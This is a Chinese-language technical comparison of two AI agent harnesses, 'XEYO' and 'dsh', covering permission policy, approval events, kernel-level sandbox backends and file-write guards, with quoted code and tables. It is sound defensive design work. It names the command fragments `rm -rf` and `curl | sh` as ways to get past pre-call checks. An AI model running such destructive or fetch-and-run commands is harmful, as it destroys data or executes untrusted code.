| 4 | `raw_name in _ALWAYS_ALLOW` | **ALLOW** `tool_unrestricted_p0` | 1421-1426 |
| 5 | `raw_name in _OUTBOUND_ASK_TOOLS` | SendToWeChat：缺 path→**DENY**；路径越界→**DENY**；`is_max_permission_mode()`→**ALLOW** `outbound_max_allow`；否则 **ASK** | 1429-1470 |
| 6+ | `ui_ask`（`_evaluate_ui_ask:506`）/ `read_path`（`_pick_path:437`、`readonly_gate:417`）/ `write_path` / `agent_allow`（`_prompt_for_agent:480`）/ `bash`（`_evaluate_bash:822`）/ `interactive` | 见 §4.3 | — |

**`_evaluate_bash` 的 5 道硬拦 + 语义分析（`:822-1015`，共 194 行）**

辅助函数链：`_bash_write_target:765` → `_bash_writes_file:785` → `_peer_bash_conflict:1016` → `_bash_touches_policy_file:1092` → `_bash_write_path_block:1109`。
即 XEYO 会**从 bash 命令文本反推写目标**，再套用 `write_path` 策略——这是 XEYO 权限系统最重的单块逻辑。

**`PermissionDecision` 三态**：`ALLOW` / `ASK` / `DENY`（`policy.py:55` 起）。
**权限模式**：`permission_mode()` 取值含 `always`；`is_max_permission_mode()`（`:219`）；`_default_permission_mode:175`、`_runtime_mode_effective:188`、`begin_permission_turn:229`（turn 边界拍基线）。
**会话档位**：`session_permission_profile`（`:268`）。
**只读闸**：`readonly_gate`（`:417`）、`tool_allowed_in_mode`（`:386`）。

###### 4.2 dsh —— 三个 whole-value knob + 投影折叠

**`PermissionSelect`（`interaction/permission-presets/src/types.ts`）**

```ts
export interface PresetOption {
  value: string        // 稳定选项值：表键，或 'custom'
  name: string         // 展示标签
  description?: string // 一句话说明
}
export interface PermissionSelect {
  options: PresetOption[]   // 表序 + 恰好当 custom 有效时追加的 'custom'
  currentValue: string
}
```

**关键：`permissions` 是投影（projection），不是单一事件**——

> The session's permission select, folded from the three whole-value knob events (`permission/preset`, `sandbox/mode`, `approval/policy`) over the composition defaults. **Key absence means no permission service is composed — clients hide the control.**

**沙箱模式 3 值（`sandbox/sandbox-policy/src/index.ts`）**

| 值 | 渲染给模型的策略句（原文，`renderPolicyContext`） |
|---|---|
| `read-only`（**fail-safe 默认**） | "Current DSH file policy: read-only. Any available operation enforced by the DSH file sandbox cannot modify files in the standing mode. **Do not refuse a required modification from this policy alone**: try an available tool normally and follow any denial and escalation guidance it returns." |
| `workspace-write` | "Current DSH file policy: workspace-write. …may modify files under the session workspace: `<root JSON>`。Some platform temporary areas may also be writable." |
| `danger-full-access` | "Current DSH file policy: danger-full-access. The DSH file sandbox does not restrict file modifications by available operations." |

**注意**：这段文本**不是事件**，是"每请求重建的动态 context"——注释写明理由：**避免切换策略时重写稳定的 system-prompt 缓存前缀**。

###### 4.3 权限字段级差异矩阵

| 维度 | dsh | XEYO |
|---|---|---|
| 判定入口 | 事件瀑布 + 组合的 policy 插件 | 单函数 `evaluate_policy` → `evaluate_policy_impl` |
| 结果枚举 | `allow / ask / deny / none`（merge 优先序 **deny > ask > allow**，首个 `continue:false` 粘滞） | `ALLOW / ASK / DENY`（三态） |
| 策略来源 | 组合（preset + knob 事件） | `.xeyo-policy.json`（`deny_tools`）+ 模式 + meta 表策略类 |
| 默认档 | **`read-only`**（fail-safe） | 由模式决定（非 fail-safe 单一默认） |
| 沙箱联动 | 权限档 → sandbox policy（强耦合） | 权限与沙箱**不耦合**（XEYO 无沙箱层） |
| 授权留存 | grant 概念在用户审批层（`allowed-once` 唯一授予值） | **grant store + 指纹 v2**（`grant_fingerprint`，含 `matched_rule` 与 `mcp_target`） |
| 排除条件 | — | worker 沙箱 / 远程会话 / `permission_mode=always` / bash 复合命令 **四类不吃 grant** |
| 命令语义分析 | ❌（不做 bash 文本反推） | ✅ `_bash_write_target` 等 5 个函数从命令反推写目标 |
| 策略告知模型 | **不给**（`approval/policy` 是 log-only，注释明写"stays out of the model transcript"） | **给**（T_now `runtime_mode_snapshot` 块） |
| 停用即时性 | 停用 → DENY | 停用 → DENY，且**不可被 grant 穿越**（`evaluate_policy` 首行 `!= ASK` 早返） |

---

##### §5 审批与提问：逐字段

###### 5.1 XEYO —— 4 组挂起/解决事件（八元组）

| 组 | Pending 事件字段 | Resolved 事件字段 |
|---|---|---|
| **权限** | `request_id`, `tool_name`, `tool_input: dict`, `reason`, `prompt`, `path?`, `expires_at?`, `choices: list[str]`, `peer_summary`, `intent`（3 值） | `request_id`, `approved: bool`, `actor`, `reason`, `resolved_at?`, `choice`（4 值：allow/deny/remind/timeout） |
| **提问** | `request_id`, `session_id`, `turn_id`, `question`, `options: list[str]`, `default?`, `expires_at?` | `request_id`, `answer`, `actor`, `timeout: bool`, `resolved_at?` |
| **计划** | `request_id`, `session_id`, `turn_id`, `plan: str`, `expires_at?` | `request_id`, `approved`, `actor`, `reason`, `resolved_at?` |
| **过期预告** | `request_id`, `expires_at?`, `seconds_left=30.0`（**未入联合**） | — |

**HTTP 接口（`server/routers/control.py`）**

| 方法 | 路径 | 用途 |
|---|---|---|
| POST | `/v1/permission/resolve` | 权限审批 resolve |
| GET | `/v1/permissions/grants` | 列已存 grant |
| DELETE | `/v1/permissions/grants/{grant_id}` | 删 grant |
| POST | `/v1/ask/resolve` | 提问作答 |
| POST | `/v1/plan/{turn_id}/approve` | 计划批准 |
| POST | `/v1/interrupt`、`/api/interrupt` | 中断 |

**审批是否入 JSONL**：`TaskStateEvent`（`task_status` 含 `waiting_permission`）与会话状态事件都会进 transcript；`LlmRetryEvent` 注释明确**不进 transcript**。

###### 5.2 dsh —— 审批四值 + 三处 log-only

| 项 | 内容 | 证据 |
|---|---|---|
| 事件 | `approval/asked`、`approval/decided`、`approval/policy` | `interaction/user-approval/src/{types,index}.ts` |
| 策略事件性质 | `approval/policy` **log-only**，永进日志、永不进模型 transcript | 同前轮已核 |
| 授予值 | 封闭四值，**唯一授予值是 `allowed-once`**；无 answerer → `unavailable`（fail-closed）；answerer 返回词汇外值 → 归一为 `unavailable` | 前轮已核 |
| 超时 | 默认 600000ms（hook 侧）/ user-approval 自带超时 | 前轮已核 |
| 模型可见性 | **不可见**（审批策略句以动态 context 形式给，事件本身不给） | `sandbox-policy` + `user-approval` 注释 |

###### 5.3 差异

| 维度 | dsh | XEYO |
|---|---|---|
| 挂起种类 | 1 类（审批） | **4 类**（权限 / 提问 / 计划 / 过期预告） |
| 过期预告 | ❌ | ✅ 独立事件 + 30s 默认提前量 |
| 计划确认 | 走 `plan/mode` 状态 | 独立 `plan_pending/plan_resolved` 事件 + HTTP approve |
| 审批入日志 | ✅ `approval/asked`/`decided` | ✅ TaskStateEvent（状态级） |
| 模型可见审批状态 | **否**（刻意） | **是**（T_now `runtime_mode_snapshot`） |

---


## 域 12 · 沙箱与执行隔离

> 来源：**R1 功能面·全量对比** · 原节「11. 沙箱与隔离」（源 L294–308）

##### 11. 沙箱与隔离

| | XEYO | dsh |
|---|---|---|
| OS 级沙箱 | **完全没有**（全仓 grep `landlock`/`seatbelt`/`bwrap` 零命中，排除 venv 后） | **四平台后端**：Linux `bwrap` + `landlock`、macOS `seatbelt`、Windows `windows-acl`（`sandbox-local/src/index.ts:159` `PLATFORM_CHAINS`） |
| 原生实现 | — | `native/landlock-run`：`@deepseek-ai/node-addon-landlock-run`，`LAUNCHER_FAILURE_EXIT=125` |
| 云端沙箱 | — | `packages/e2b/`（E2B POC：`fs-e2b` + `subprocess-e2b`） |
| 降级 | — | **fail-closed**：请求受限模式但无可用后端 → 拒绝（`sandbox/src/index.ts:131-143`）；强制等级 `bwrap/landlock/seatbelt=full`、`windows-acl=partial`（`sandbox-local:177-187`） |
| 与文件系统的关系 | 权限层拦工具调用 | `fs-sandbox` 提供者：`read-only` 全拒 / `workspace-write` 限 `writableRoots` / `danger-full-access` 不围栏（`fs-sandbox/src/index.ts:122-134`） |
| 与 shell 的关系 | — | `bash-sandbox` 在 spawn 前 `ctx.sandbox.confine(argv, policy)`（`sandbox/src/index.ts:175`） |

> 这是 **dsh 领先最大的一项**。XEYO 的安全完全依赖「工具调用前判定」，一旦工具本身被绕过（例如 Bash 里 `rm -rf`），没有第二道防线。XEYO 侧对应物是 `bash_tool/destructive_guard.py`（关键词/模式级），属于**启发式**而非内核隔离。

---


> 来源：**R2 设计面·设计级对比** · 原节「10. 沙箱与执行隔离」（源 L637–681）

##### 10. 沙箱与执行隔离

###### 10.1 dsh：内核级四后端 + 云沙箱，fail-closed

**抽象**：`ctx.sandbox` 是一条能力缝，唯一接口是"约束 argv"：

```ts
// packages/sandbox/sandbox/src/index.ts:154-176
confine(argv, policy): ConfinedArgv
```

作者把语义写死了（`sandbox/src/index.ts:154-156`）：「**silent unconfined passthrough is forbidden**」；`sandbox-local/src/index.ts:5-6`：「Missing or unusable confinement **fails closed** rather than returning the original argv」。

- **策略词汇**：`SandboxMode = 'read-only' | 'workspace-write' | 'danger-full-access'`，per-call 承载（`SandboxPolicy` 带 `mode/workspaceRoot/sessionId`，`sandbox/src/index.ts:29-72`）。
- **平台矩阵**（`PLATFORM_CHAINS`，`sandbox-local/src/index.ts:159-187`）：Linux `[bwrap, landlock]` / macOS `[seatbelt]` / Windows `[windows-acl]`；强制等级 `bwrap/seatbelt/landlock = full`、`windows-acl = partial`（ACL 的 Everyone/硬链接边界）。
- **不可用即拒绝**：请求受限模式但无可用后端 → `SandboxUnavailableError`（`SANDBOX_UNAVAILABLE`，`sandbox/src/index.ts:124-144`）；`selectRunner` 无候选直接抛（`sandbox-local/src/index.ts:492-496`）。
- **消费侧**：`SandboxBashExecutor` 在 spawn 前 `confine(['bash','-c',cmd], policy)`，且有一条精细的优先级规则——「runner 启动失败（命令没跑）优先于 denial（约束生效并拦下）」（`shell/bash-sandbox/src/index.ts:88-114, 150-167`）。
- **策略默认值最保守**：`ctx.sandboxPolicy` 默认 `read-only`（`sandbox-policy/src/index.ts:111-117`），优先级 `显式 override > session 'sandbox/mode' 事件 > 部署默认`（`:163-170`）。
- **原生与云**：`native/landlock-run`（`@deepseek-ai/node-addon-landlock-run`，`LAUNCHER_FAILURE_EXIT=125`）；E2B 云沙箱（`packages/e2b/e2b/src/index.ts:77-81`，超时即删沙箱）。

###### 10.2 XEYO：没有 OS 级沙箱，只有 Windows Job Object + 容器路由

- 全仓穷举 grep `landlock|seatbelt|bubblewrap|bwrap|sandbox-exec|Job Object|AppContainer`（排除 `.venv`）**只命中 Windows Job Object**，且作者明确拒绝 AppContainer：`bash_tool/win_job.py:1-4`「不做 AppContainer——会绊住本机 git/npm」。Job Object 提供的是**内存上限 + 超时整树杀**（资源限额），**不是隔离**。
- **TerminalBench 场景走 docker 容器路由**（这是评测旁径，不是产品通用能力）：
  - `XeyoHarborAgent.setup()` 从 trial 会话名推导容器名（`__env-main-1`），置 `XEYO_DOCKER_CONTAINER` 或 `set_container_override(cid)`（ContextVar 防共进程串线）——`TerminalBench/xeyo_harbor_agent.py:40-50, 100-115, 136-146`。
  - bash 工具读 `current_container()` → docker SDK `exec_run(["bash","-lc",cmd])`（named pipe 直连，零宿主 shell 依赖）——`tools/bash_tool/bash_tool.py:568-573` + `tools/container_routing.py`。
  - 容器路径下放开审批档 `XEYO_PERMISSION_MODE=never`，仅硬边界（密钥/策略/危险路径）仍由 policy 拦截（`xeyo_harbor_agent.py:127-130`）。

###### 10.3 设计分歧

| 维度 | dsh | XEYO |
|---|---|---|
| OS 级隔离 | 四后端 + 原生 addon | **无** |
| 云沙箱 | E2B | 无（容器仅评测路由） |
| 抽象 | `confine(argv, policy)` 单函数 | 无抽象 |
| 失败姿态 | fail-closed（宁可拒跑） | 不适用（无隔离层） |
| 第二道防线 | 有（内核） | 无；只有 `destructive_guard.py` 关键词级启发式 |
| 策略默认 | `read-only` | 权限模式默认 workspace-write（工具级） |

**这是 dsh 领先最大的一项**，且差距的性质是"缺一整层"：XEYO 的安全完全依赖"工具调用前判定"，一旦落到 Bash 内部（`rm -rf`、`curl | sh`），没有第二道防线。XEYO 自己也知道——`brainstorm` 级补救是关键词黑名单，属于启发式。

**注意一个反直觉点**：dsh 的 `fs-sandbox` 作者特意声明它**不是**安全边界（`fs-sandbox/src/index.ts:13-18`）：「This is containment, not a security boundary; kernel-grade isolation of untrusted CODE stays `ctx.shell`'s job」——即：文件围栏防误伤，内核沙箱防恶意，两者职责分明。这种"明确声明某一层不负责什么"的写法，正是 XEYO 的 `AGENTS.md` 铁律在做的事，只是 dsh 用在架构层、XEYO 用在注意力层。

---


> 来源：**R3 实现面·实现级对比** · 原节「10. 沙箱与执行隔离：实现级」（源 L1162–1271）

##### 10. 沙箱与执行隔离：实现级

###### 10.1 dsh：单函数抽象 + 四平台链 + 功能探针

**`confine()` 签名与返回**（`packages/sandbox/sandbox-local/src/index.ts:316-336`）：

```ts
confine(argv: readonly string[], policy: SandboxPolicy): ConfinedArgv {
  if (this.runnerCommand !== undefined) {          // 运维显式断言：不探测，直接信任
    return { argv: [...this.runnerCommand, ...bwrapProfileArgs(policy), '--', ...argv],
             enforcement: 'full', denialSignatures: DENIAL_SIGNATURES.runnerCommand,
             runnerFailureRules: [{ fatalSignatures: this.configuredRunnerFailureSignatures }] }
  }
  const selected = this.selectRunner(policy.mode)
  const runnerArgv = this.runnerArgv(selected.runner, policy)
  return { argv: [...runnerArgv, '--', ...argv], enforcement: selected.enforcement,
           denialSignatures: DENIAL_SIGNATURES[selected.runner],
           runnerFailureRules: RUNNER_FAILURE_RULES[selected.runner] }
}
```

**返回四个东西**——不只是 argv：**执行强度（`enforcement`）、拒绝签名、runner 失败规则**。这是「执行层不仅隔离，还要能把隔离失败翻译成模型可理解的拒绝」的实现。

**三种沙箱模式**（`packages/sandbox/sandbox-policy/src/session-mode.ts:42`）：

```ts
export const SANDBOX_MODES = ['read-only', 'workspace-write', 'danger-full-access']
// 默认 read-only（sandbox-policy/src/index.ts:112 的 schema default）
```

**模式→模型可见文本**（`sandbox-policy/src/index.ts:43-48`）——`read-only` 的措辞值得逐字读：

> Current DSH file policy: read-only. Any available operation enforced by the DSH file sandbox cannot modify files in the standing mode. **Do not refuse a required modification from this policy alone: try an available tool normally and follow any denial and escalation guidance it returns.**

即：**策略声明是信息，不是禁止令**——明确要求模型「别因为这个策略就不动手，照常试，跟随拒绝/升级指引」。这是引擎铁律在 dsh 侧的对应实现（虽然 dsh 没有成文铁律）。

**runner 选择算法**（`selectRunner` `:493-508` + `chainVerdict` `:511-524`）：

```
selectRunner(mode):
  selectedRunner ??= chainVerdict()            # 每个 provider 生命周期只解析一次（缓存）
  if selectedRunner === 'unavailable' → throw SandboxUnavailableError(mode)

chainVerdict():
  chain = internals.chain ?? PLATFORM_CHAINS[platform] ?? []
  if chain 空 → 'unavailable'
  if 只有一个候选 → 直接用（不探测；执行期拒绝仍然 fail closed）
  else 按链序逐个 probeRunner()，第一个非 'unusable' 胜出
```

**探针按后端区分强度语义**（`probeRunner` `:527-556` 注释）：

| 后端 | 探针通过含义 |
|---|---|
| `bwrap` | `'full'`（mount profile 由构造保证覆盖所有承诺的文件效果） |
| `landlock` | 探针报告区分 `full` 与 per-ABI `'partial'` |
| `seatbelt` | `'full'`（deny-file-write* profile 由构造保证） |
| `windows-acl` | **永远 `'partial'`**（文档化的 Everyone 与硬链接边界） |

**拒绝签名表**（`:205-213`）——把内核级错误翻译成结构化信号：

```ts
const DENIAL_SIGNATURES = {
  bwrap:         ['read-only file system'],
  landlock:      ['permission denied'],
  seatbelt:      ['operation not permitted'],
  'windows-acl': ['access is denied', 'access to the path', 'permission denied'],
  runnerCommand: ['read-only file system', 'permission denied'],
}
```

**runner 自身失败的识别**（`:215-226`）比「看退出码」讲究得多：`windows-acl` 打印 `windows-acl-run: <detail>` 且退出 **127**，规则**以退出码门控签名匹配**——注释明确理由：「a confined command that merely PRINTS the signature (or a runner …)」不应被误判为 runner 失败。`Landlock` 是版本化的 exit-125 契约；`bwrap` 与 `sandbox-exec` 只做签名匹配（因为它们的公开契约没有保留失败状态码）。`RunnerFailureRule` 的应用顺序（`sandbox/src/index.ts:74-86`）：**先 `allowedExitCodes` 门控 → 再按整行精确相等剔除 `informationalLines` → 再在剩余 stderr 行内大小写不敏感匹配 `fatalSignatures`**。

**Windows ACL 后端的实现细节**（`packages/sandbox/sandbox-windows-acl/`）：
- 授予是**按 provider 生命周期物化的**：workspace-root 常驻授权 + 每个 live session/workspace 对的**可撤销、随机的私有 temp 能力**（`sandbox-local/src/index.ts:352-360` 注释）；
- runner 收 `--write-sid` / `--temp-write-sid`，**自己不做任何授权**；
- 无 agent 的 workspace-write 调用传 ambient temp ROOT、不带 SID flag，runner 为那一次调用创建并删除一个随机私有子目录；
- `token.ts:179` 注释提到「每个 confined 模式」与「**C:\-root 建树的逃逸**（标准 …）」——说明 ACL 设计考虑过绝对路径逃逸；
- `win32-abi.ts:25`：`WRITE_DAC` 与 `WRITE_OWNER` **刻意排除**，让被限子进程无法改写 ACL 自解锁。

**升级通道**：模型可以申请放宽（`ESCALATION_TARGETS`），走 §9.1 的 `approveEscalation` 严格放宽 + 审批；**gated by 退出码 127 / 版本化 125** 的失败识别让「隔离失败」与「命令自己失败」不混淆。

###### 10.2 XEYO：没有 OS 级沙箱

**实测否定结论**（排除 `.venv`/`__pycache__` 的全仓 grep，第二轮已做、本轮沿用）：`landlock|seatbelt|bubblewrap|bwrap|sandbox-exec` **零命中**。XEYO 的隔离手段只有两样：

1. **Windows Job Object**——第二轮核实为**资源限额**（进程数/内存），不是文件系统隔离；
2. **docker 容器路由**——仅评测链路（`TerminalBench/xeyo_harbor_agent.py`），**不是产品路径**，且已知属于「宿主空 scratch + 容器内执行」的旁径（C2 口径）。

**XEYO 真正等价于「沙箱」的东西是权限层**：写作用域（`write_scope`）、受保护元数据（`.git/.xeyo/.agents` 工作区内默认只读）、密钥路径硬拦、工作区外默认拒绝、`deny_tools`。这是**路径级策略**，不是**内核级隔离**。

###### 10.3 实现级对照

| 维度 | dsh | XEYO |
|---|---|---|
| 抽象 | `confine(argv, policy) -> {argv, enforcement, denialSignatures, runnerFailureRules}` | 无（无此抽象） |
| 隔离层级 | 内核级（bwrap mount namespace / Landlock LSM / Seatbelt profile / Windows ACL） | 路径级策略（权限函数）+ 资源限额（Job Object） |
| 平台链 | Linux 双后端（bwrap→landlock）、macOS、Windows，按链序探测 | 仅 Windows Job Object（非隔离） |
| 探测 | 启动期功能探针，结果缓存；无可用 runner → 抛 `SANDBOX_UNAVAILABLE` | 无 |
| 失败姿态 | **fail-closed**（链空/探测失败/执行期拒绝都封死） | 权限函数 fail-safe（异常回 ASK） |
| 拒绝识别 | 签名表 + 退出码门控（125/127）+ 整行剔除 benign | 无（无 runner 概念） |
| 升级 | 严格放宽 + 审批，授权仅单次 | 无（改为改 `permission_mode`） |
| 默认档 | `read-only` | 写默认 ask（工作区内） |
| 云沙箱 | E2B POC（独立包） | 无 |
| 容器 | 未见产品路径 | docker 仅评测旁径 |

**判断**：这是本轮差距最大的一处，且是**「缺一整层」**——XEYO 的策略能拦住「模型通过工具写敏感路径」，拦不住「模型让 bash 起一个子进程自己绕过一切」。

---


> 来源：**R4 枚举面·逐字段级对比** · 原节「§8 沙箱：逐平台、逐参数」（源 L792–872）

##### §8 沙箱：逐平台、逐参数

###### 8.1 服务接口

```ts
// packages/sandbox/sandbox/src/index.ts:39-72, 153-175
export interface SandboxExecutionPolicy {
  mode: SandboxMode               // 'read-only' | 'workspace-write' | 'danger-full-access'
  workspaceRoot: string           // workspace-write 可写的绝对根
  sessionId?: SessionId           // 后端按会话键控私有状态（如 windows-acl 的私有 temp + SID）
}
export interface SandboxPolicy extends SandboxExecutionPolicy {
  mode: ConfinedSandboxMode       // per-call 携带，不是 provider 固定
}
export type SandboxEnforcement = 'full' | 'partial'

abstract class SandboxProvider {
  abstract confine(argv: readonly string[], policy: SandboxPolicy): ConfinedArgv
}
```

**原文不变量**：

> {@link confine} must return enforcing argv **or fail closed** at wrap or runner-execution time; **silent unconfined passthrough is forbidden**.

**错误码**：`SANDBOX_UNAVAILABLE`；异常文案原文：

> `... refusing to run the command unconfined. Install bubblewrap or run a Landlock-enforcing ...`

###### 8.2 四平台 argv 逐参数（`sandbox/sandbox-local/src/profiles.ts`）

**Linux / bwrap**

```ts
['--ro-bind', '/', '/', '--dev', '/dev', '--unshare-pid', '--proc', '/proc', '--die-with-parent']
// workspace-write 追加：
['--tmpfs', '/tmp', '--bind', policy.workspaceRoot, policy.workspaceRoot]
```

**Linux / Landlock**（`@deepseek-ai/node-addon-landlock-run` 的原生 addon）

```ts
grantArgs({ readOnly: ['/'], readWrite: ['/dev/null' (+ '/tmp', workspaceRoot when workspace-write)] })
```

**macOS / Seatbelt**（SBPL profile）

```
(version 1) (allow default) (deny file-write*)
(allow file-write* (literal "/dev/null"))
[+ (allow file-write* (subpath "<root1>") (subpath "<root2>") …)]
```

**Windows / ACL**（`sandbox-windows-acl/`，9 个文件）：`acl.ts` / `ffi.ts` / `grant.ts` / `path-boundary.ts` / `runner.ts` / `spawn.ts` / `token.ts` / `win32-abi.ts` / `workspace-sid.ts`
→ 实现方式是 **Win32 FFI + 受限 token + 按 workspace 的 SID + 按会话的私有 temp**。`SandboxExecutionPolicy.sessionId` 的注释原文：

> backends key per-session state off it (e.g. windows-acl gives each live session/workspace pair a random private temp directory and SID, while the workspace SID and standing grant remain per-workspace)

**`writableRoots(policy)`**：seatbelt 授权与进程内 fs 栅栏（`fs-sandbox`）**共用同一个 helper**，注释明写"so the Seatbelt grant and the in-process fs fence can never drift apart"。

###### 8.3 E2B 与降级

- `packages/e2b/`：云沙箱 POC（本轮未逐行读，属"未见细节"）。
- `sandbox/src/escalation.ts`：升级仲裁（失败关闭序列）；`DENIAL_SIGNATURES` 在 `sandbox-local` 中定义，用于**从 stderr 识别沙箱拒绝**（区分"命令没跑"与"沙箱成功拦下"）。
- `RunnerFailureRule` 逐字段：`allowedExitCodes?`（非零退出码白名单，省略=任意非零）/ `informationalLines`（按行**大小写不敏感精确相等**剔除）/ `fatalSignatures`（在剩余 stderr 行内**大小写不敏感**匹配）。
  → 注释原文："**Exit status alone never proves runner failure.**"

###### 8.4 XEYO 的沙箱面

| 项 | XEYO 实测 |
|---|---|
| OS 级隔离 | ❌ 无（全仓 `landlock\|seatbelt\|bubblewrap\|bwrap\|sandbox-exec` 零命中，排除 `.venv`） |
| 进程资源限额 | ✅ Windows **Job Object**（资源限额，非文件隔离） |
| 容器路由 | ✅ `TerminalBench/xeyo_harbor_agent.py`（评测旁径：`docker exec` 进容器，cwd 是自建空目录） |
| fs 栅栏 | 有路径白名单（`_effective_roots` / `path_in_allowed_working_path`），但**不是内核强制** |
| 降级 | 无降级概念（因为没有强制层） |

**结论**：dsh 的沙箱是**层**（4 后端 + 策略服务 + 升级仲裁 + 失败证据规则 + 进程内 fs 栅栏），XEYO 的对应位置是**若干 `if` 判断**。

---


## 域 13 · 文件系统能力与写入策略

> 来源：**R1 功能面·全量对比** · 原节「12. 文件系统」（源 L309–320）

##### 12. 文件系统

| | XEYO | dsh |
|---|---|---|
| 统一通道 | `tools/*` 多数走 python 文件 API；`server/workspace_fs.py` 是**旁路**（默认拒直写，需 `XEYO_WORKSPACE_FS_WRITABLE=1`，`workspace_fs.py:39-41`，不穿权限/rewind） | 一律经 `ctx.fs`（`fs/src/index.ts` 注释：*tool-fs executes through ctx.fs*） |
| 默认只读 | 默认关闭（`fs-local` 的 `sandboxMode` 返回 `undefined`，只有挂载 `fs-sandbox` 才生效） | 由 `sandbox-policy` 部署默认 `read-only`（`sandbox-policy:112`） |
| 陈旧写守卫 | **未见** | `writeText` 带陈旧版本守卫（`fs-local:182-191`） |
| 读前写策略 | **未见**强制的 read-before-write | `fs-observation-policy`（`fs/*` 事件门，无 schema 变更）：未先读则拒绝写/编辑（`docs/tool-catalog.md:27`） |
| 事件 | — | `fs/write-intent`、`fs/edit-intent`、`fs/observed`（`fs/src/index.ts:58`） |

---


> 来源：**R2 设计面·设计级对比** · 原节「11. 文件系统能力与策略」（源 L682–716）

##### 11. 文件系统能力与策略

###### 11.1 dsh：一切经 `ctx.fs`，三事件 + 两层守卫

**三角色**：

- Service Definition：`FileSystem` 抽象 + `fs/write-intent` / `fs/edit-intent` / `fs/observed` 三事件（`packages/fs/fs/src/index.ts:49-105`）。
- Provider `LocalFileSystem`：`writeText` 带**陈旧版本守卫**——`replaceIfVersion` 比对 observed version；`createIfAbsent` 落在已存在文件 → `FS_NOT_OBSERVED`（`fs-local/src/index.ts:182-191`）。
- 沙箱围栏 `SandboxedFileSystem`：继承 local，仅对两处变更加 per-call 策略栏——`read-only` 全拒 / `workspace-write` 仅限 `writableRoots` 内 fresh canonical 路径 / `danger-full-access` 解锁（`fs-sandbox/src/index.ts:122-144`）。
- **读前写强制**：`fs-observation-policy`——未先 read，则 write → `createIfAbsent`、edit → `FS_NOT_OBSERVED`；实现为**事件单槽决策**（`fs-observation-policy/src/index.ts:61-94`）。
- Consumer `tool-fs` **只持有 schema/呈现/观察事件，不持有 provider**（`tool-fs/src/index.ts:22`）——这是"换后端不改工具"的具体体现。

###### 11.2 XEYO：三条写通道，覆盖不均

| 通道 | 实现 | 守卫 |
|---|---|---|
| `Write`/`Edit` 工具 | `engine/write_store.py:167-232, 234-275` | 每文件分片锁 + 路径硬门禁（`_canon` 拒工作区外 + `write_scope_deny_reason`）+ **陈旧哈希拒绝** + 原子写 + `journal.record_change` 审计 |
| `server/workspace_fs.py` | 旁路 | 默认拒绝写；开启后**不穿权限/rewind**，仅审计 |
| Bash 改文件 | `bash_tool.py:57-112` | 无写守卫；改后 `_invalidate_search_caches` 失效搜索缓存 |
| `Read` | `filesystem.check_read_permission_for_tool` | 读权限 |

###### 11.3 设计分歧

| 维度 | dsh | XEYO |
|---|---|---|
| 统一通道 | **是**（一切经 `ctx.fs`） | **否**（三通道） |
| 默认只读 | 由 `sandbox-policy` 部署默认 `read-only` | 写通道默认可用（权限模式下） |
| 陈旧写守卫 | `replaceIfVersion`（provider 层） | 陈旧哈希拒绝（WriteStore 层） |
| 读前写强制 | **是**（`fs-observation-policy`） | 有 `missing_read` 类静默报错（同思路，落在执行层） |
| 写意图事件 | `fs/write-intent` / `fs/edit-intent` | 无（有审计事件 `tool.started/finished`） |

有趣的是两者**独立想到了同一件事**：dsh 用 `FS_NOT_OBSERVED`，XEYO 用 `missing_read: no prior Read for this path in this session`——都是"没读过就不许写"的**中性结果型报错**。这是本轮第二个"真·独立收敛"，与 §0.1 那个假的不同：两边的报错措辞、触发点（provider 策略 vs 工具层）都各自独立可证。

---


> 来源：**R3 实现面·实现级对比** · 原节「11. 文件系统能力：实现级」（源 L1272–1338）

##### 11. 文件系统能力：实现级

###### 11.1 dsh：一切经 `ctx.fs`，容器判定有真实现

**seam 结构**：`packages/fs/fs`（Service Definition + `types.ts` + `invariant.ts`）、`fs-local`（Provider：`fsio.ts` / `win32.ts`）、`fs-sandbox`（`containment.ts` / `index.ts`）、`fs-observation-policy`（读前写前观察策略）、`tool-fs`（消费者：`read.ts` / `edit.ts` / `write` / `diff.ts` / `read-image.ts` / `read-render.ts` / `read-target.ts` / `sandbox.ts` / `session-cwd.ts` / `error.ts`）。

**路径包含判定的实现（`fs-sandbox/src/containment.ts`）**——这是本轮读到的最讲究的一段工程代码：

```ts
/** 第一段：词法快速路径 */
function isLexicallyUnder(path, root, caseSensitive): boolean {
  const comparableTarget = comparablePath(path, caseSensitive)
  const comparableRoot = comparablePath(root, caseSensitive)
  if (comparableTarget === comparableRoot) return true
  const prefix = comparableRoot.endsWith(sep) ? comparableRoot : comparableRoot + sep
  return comparableTarget.startsWith(prefix)
}

/** 第二段：文件系统身份回退（dev + ino） */
function sameIdentity(left: BigIntStats, right: BigIntStats): boolean {
  return left.dev === right.dev && left.ino === right.ino
}

/** 第三段：走 target 已有祖先，逐级比对文件系统身份 */
export async function isPathUnder(path: string, root: string, …): Promise<boolean> { … }
```

模块 docstring 说明了为什么要三段：

> Canonical spellings take the fast lexical path; **filesystem identity supplies the conservative fallback for alias-equivalent roots such as Windows 8.3 names and casing.**

即：**不把包含性判定弱化成文本近似**——遇到拼写不一致时，走 `stat(bigint)` 逐级祖先比对 `dev/ino`，因此 Windows 8.3 别名与大小写差异不会造成误判。`MISSING_CODES = {ENOENT, ENOTDIR}` 表示「目标可以有一段尚不存在」，只对**已存在的祖先**做身份比对（`:28-38`, `:53-60`）。

**观察策略**（`fs-observation-policy`）作为一个**独立 gate 包**存在，且**不改 schema**（tool-catalog 明说「an `fs/*` event-gate plugin, no schema change」）：读前/写前状态观察 → 产生 `fs/write-intent` / `fs/edit-intent` / `fs/observed` 事件。**「读前必须先读」这条规则是事件门，不是工具参数。**

**工具面**：`edit`, `read`, `read_image`, `write`（`tool-fs`）+ `str_replace_editor`（独立包，view/create/唯一字面替换/按行插入）+ `glob`/`grep`（`tool-fs-search`，**spawn 打包的 ripgrep 二进制，走 `ctx.subprocess`，从不作为后台 job**——tool-catalog 明确：「no host `rg` install and no shell layer」，且文档配置选了 `sampleOverCapGlobResults: true`）。

###### 11.2 XEYO：三条写通道，覆盖不均

| 通道 | 实现 | 覆盖 |
|---|---|---|
| 专用工具 | `tools/file_read_tool/`、`file_write_tool/`、`file_edit_tool/`、`fileio/` | **全**：过 `evaluate_policy`（§9.2 第 9/10 分支的全部硬拦） |
| `server/workspace_fs.py` 直写 | 服务端 workspace 文件接口 | **绕过**权限/rewind/审计（默认只读开关关） |
| WriteStore | `engine/write_store.py`；`ToolMeta.needs_write_store` | 由注册标记决定是否走统一写通道——**是选择项而非强制** |

